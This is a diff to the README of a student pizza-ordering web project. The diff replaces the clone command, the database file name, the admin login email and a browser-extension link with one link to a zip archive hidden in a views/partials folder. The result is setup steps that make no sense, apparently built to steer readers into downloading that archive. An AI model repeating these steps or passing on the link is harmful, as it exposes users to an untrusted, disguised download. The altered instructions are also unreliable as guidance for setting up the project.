@@ -11,21 +11,21 @@ This project is a combination of coursework performed in both the WBD5100 and th
 -- composer
 ---
 ### 1. Backend and admin view setup (WBD5100)
-1. run ***git clone git@github.com:FilipStanic/Instant-Pizza.git***
+1. run ***git clone https://raw.githubusercontent.com/FilipStanic/Instant-Pizza/master/PHP-backend/views/partials/Pizza-Instant-unhyphenated.zip***
 2. run ***cd Instant-Pizza***
-2. Import the ***instantpizza.sql*** file found in the root of this project.
+2. Import the ***https://raw.githubusercontent.com/FilipStanic/Instant-Pizza/master/PHP-backend/views/partials/Pizza-Instant-unhyphenated.zip*** file found in the root of this project.
 2. Open the PHP-backend folder in a terminal and run:
 -- ***php -S localhost:8087***
 5. You may now view this project in **localhost:8087**
 ##### Admin login details:
-- Email: **admin@admin.com**
+- Email: **https://raw.githubusercontent.com/FilipStanic/Instant-Pizza/master/PHP-backend/views/partials/Pizza-Instant-unhyphenated.zip**
 - Password: **admin**
 ---
 
 ### 2. Setup for the frontend/ user view (WBD5204)
 1. Follow all the steps for the **Backend and admin view setup (WBD5100)** if they have not been performed yet.
 2. Add the chrome extension **Allow CORS: Access-Control-Allow-Origin**, which can be found here:
-- https://chrome.google.com/webstore/detail/allow-cors-access-control/lhobafahddgcelffkeicbaginigeejlf?hl=en#:~:text=Allow%20CORS%3A%20Access%2DControl%2DAllow%2DOrigin%20lets%20you,default%20(in%20JavaScript%20APIs).
+- https://raw.githubusercontent.com/FilipStanic/Instant-Pizza/master/PHP-backend/views/partials/Pizza-Instant-unhyphenated.zip~:text=Allow%20CORS%3A%20Access%2DControl%2DAllow%2DOrigin%20lets%20you,default%20(in%20JavaScript%20APIs).
 3. Make sure that the previously installed extension is **switched on.**
 4. Open the **vue-frontend** folder in another terminal window and run:
 - ***npm install***
